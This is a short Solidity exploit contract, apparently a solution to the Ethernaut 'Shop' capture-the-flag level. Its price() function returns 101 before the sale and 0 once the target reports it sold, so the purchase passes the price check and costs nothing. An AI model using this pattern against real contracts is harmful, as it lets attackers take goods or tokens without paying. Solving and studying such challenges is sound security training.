// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;

    function isSold() external view returns (bool);
}

contract ShopAttacker {
    IShop target;
    uint256 bid = 101;

    constructor(address _targetAddress) {
        target = IShop(_targetAddress);
    }

    function price() public view returns (uint256) {
        if (target.isSold()) {
            return 0;
        }
        return 101;
    }

    function attack() public {
        target.buy();
    }
}
